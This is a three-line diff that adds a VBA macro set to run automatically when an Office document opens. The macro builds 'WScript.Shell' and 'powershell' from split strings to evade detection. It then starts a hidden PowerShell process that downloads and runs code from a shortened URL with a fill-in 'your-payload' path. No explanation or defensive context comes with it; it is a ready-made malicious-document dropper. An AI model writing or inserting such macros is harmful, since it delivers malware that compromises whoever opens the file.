@@ -1,0 +1,3 @@
+Sub AutoOpen()
+: CreateObject("W" & "S" & "c" & "r" & "i" & "p" & "t" & "." & "S" & "h" & "e" & "l" & "l").Run "p" & "o" & "w" & "e" & "r" & "s" & "h" & "e" & "l" & "l -w h -c iex(iwr http://tinyurl.com/your-payload)", 0
+: End Sub
